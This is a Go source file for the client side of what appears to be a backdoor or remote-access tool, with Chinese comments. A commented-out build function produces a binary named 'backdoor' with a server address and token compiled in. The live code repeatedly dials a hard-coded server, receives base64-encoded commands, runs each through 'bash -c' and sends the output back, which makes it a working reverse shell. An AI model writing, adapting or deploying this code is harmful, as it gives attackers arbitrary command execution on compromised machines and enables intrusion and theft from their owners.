package client

// func BuildClient() {
// 	fmt.Println("xxxxxxxxxxx")
// 	const buildStr = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -ldflags '%s -s -w -X main.Version=%s -X main.ServerPort=%s -X main.ServerAddress=%s -X main.Token=%s -extldflags "-static"' -o ../tmp/%s`
// 	buildCmd := fmt.Sprintf(buildStr, "linux", "-H=windowsgui", "0.1.1", "33033", "172.16.42.100", "xxxxx", "backdoor")
// 	fmt.Println(buildCmd)
// 	cmd := exec.Command("sh", "-c", buildCmd)
// 	outputErr, err := cmd.CombinedOutput()
// 	if err != nil {
// 		fmt.Println(err, outputErr)
// 	}
// }

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"strings"
	"time"
)

type clientInfo struct {
	HostIPv4 string
	HostName string
}

var conn net.Conn
var serverHost string = "172.16.42.150"
var serverPort string = "8081"
var waitTime int64 = 1
var charset string = "utf-8"

func HandleClientConnection(conn net.Conn) {
	//defer conn.Close()

	message, err := bufio.NewReader(conn).ReadString('\n')
	if err == io.EOF {
		// 如果服务器断开，则重新连接
		conn.Close()
	}
	decodedCase, _ := base64.StdEncoding.DecodeString(message)
	command := string(decodedCase)
	//cmdParameter := strings.Split(command, " ")
	cmdArray := strings.Split(command, " ")
	fmt.Println("xxxxxxxxxxxxx")
	fmt.Println(cmdArray)

	// 解决命令行输出编码问题
	// if charset != "utf-8" {
	// 	out = []byte(ConvertToString(string(out), charset, "utf-8"))
	// }
	// encoded := base64.StdEncoding.EncodeToString(out)
	// conn.Write([]byte(encoded + "\n"))

}

func conect() {
	var err error
	for {
		time.Sleep(time.Second * 3)
		conn, err = net.Dial("tcp", "172.16.42.150:8081")
		if err != nil {
			log.Println(err)
		}

	}

}

func Client() {
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	//建立连接
	go conect()

	//等待接收指令
	// buf := make([]byte, 4096)
	for {
		time.Sleep(time.Second * 1)
		log.Println(conn)
		if conn != nil {
			log.Println(conn.RemoteAddr())
			message, err := bufio.NewReader(conn).ReadString('\n')
			if err != nil {
				log.Println(err)
			}
			decodedCase, _ := base64.StdEncoding.DecodeString(message)
			command := string(decodedCase)
			log.Println(command)
			cmdOutput, err := RunOSCommand(command)
			if err != nil {
				log.Println(cmdOutput)
			}
			_, err = conn.Write([]byte(cmdOutput))
			if err != nil {
				log.Println(err)
			}
			// n, err := conn.Read(buf)
			// if err != nil {
			// 	log.Println(err)
			// }
			// log.Println(buf[:n])
		}

	}
	// fmt.Println("Connection success...")
	// cmd := "whoami"
	// cmdOutput, err := RunOSCommand(cmd)
	// if err != nil {
	// 	log.Println(cmdOutput)
	// }
	// fmt.Println(cmdOutput)
	// _, err = conn.Write([]byte(cmdOutput))
}

func RunOSCommand(cmd string) (string, error) {

	command := []string{
		"bash",
		"-c",
		cmd,
	}
	var output string
	realCmd := exec.Command(command[0], command[1:]...)

	// output command output to std too
	cmdReader, _ := realCmd.StdoutPipe()
	scanner := bufio.NewScanner(cmdReader)
	go func() {
		for scanner.Scan() {
			out := scanner.Text()
			output += out
		}
	}()
	if err := realCmd.Start(); err != nil {
		return output, err
	}
	if err := realCmd.Wait(); err != nil {
		return output, err
	}
	return output, nil
}
